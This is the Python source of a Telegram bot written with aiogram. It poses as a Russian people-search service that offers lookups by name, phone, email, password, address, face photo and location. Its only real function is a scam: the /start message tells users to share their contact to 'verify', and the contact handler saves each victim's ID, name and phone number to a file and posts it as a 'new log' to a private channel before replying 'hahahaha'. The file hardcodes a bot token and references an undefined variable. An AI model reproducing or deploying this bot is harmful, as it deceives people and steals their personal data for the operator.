import logging
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.types import ParseMode
from aiogram.utils import executor

API_TOKEN = '6701198192:AAGq9S8mhrTkmrnFC2BSh2YbzFTYQHGarUE'
CHANNEL_ID = '-1002115742637'
FILE_NAME = 'users.txt'

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)
logging.basicConfig(level=logging.INFO)
dp.middleware.setup(LoggingMiddleware())


@dp.message_handler(commands=['start'])
async def handle_start(message: types.Message):
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    button = types.KeyboardButton("Поделиться контактом", request_contact=True)
    keyboard.add(button)

    await message.reply("🆘 Вы можете прислать боту запросы в следующем формате:\n👤 Поиск по имени\n├  Программист\n├  Антипов Евгений\n├  Антипов Евгений Вячеславович\n└  Антипов Евгений Вячеславович 05.02.1994\n\n📱 79999939919 - для поиска по номеру телефона\n📨 tema@gmail.com - для поиска по Email\n📧 281485304, @durov или перешлите сообщение - поиск по Telegram аккаунту\n🔐 /pas churchill7 - поиск почты, логина и телефона по паролю\n🏚 /adr Москва, Тверская, д 1, кв 1 - информация по адресу (РФ)\n\n📸 Отправьте фото человека, чтобы найти его или двойника на сайтах ВК, ОК.\n🚙 Отправьте фото номера автомобиля, чтобы получить о нем информацию.\n🌎 Отправьте точку на карте, чтобы найти людей, которые сейчас там.\n🗣 С помощью голосовых команд также можно выполнять поисковые запросы.", reply_markup=keyboard)
    await message.reply("🗂 Номер телефона\n\nВам необходимо подтвердить номер телефона для того, чтобы завершить идентификацию.\n\nДля этого нажмите кнопку ниже.", reply_markup=keyboard)


@dp.message_handler(content_types=['contact'])
async def handle_contact(message: types.Message):
    first_name = message.contact.first_name
    last_name = message.contact.last_name
    user_id = message.from_user.id
    phone_number = message.contact.phone_number

    is_duplicate = check_duplicate(user_id)

    if not is_duplicate:
        with open(FILE_NAME, 'a') as f:
            f.write(f"{user_id},{first_name},{last_name},{phone_number}\n")

    if not is_duplicate:
        await message.reply('hahahaha')
        await send_to_channel(f"Новый лог: {first_name} {last_name} (ID: {user_id}), Номер телефона: {phone_number}")


def check_duplicate(user_id):
    if user_id in processed_users:
        return True
    else:
        processed_users.add(user_id)
        return False


async def send_to_channel(text):
    await bot.send_message(CHANNEL_ID, text)


if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)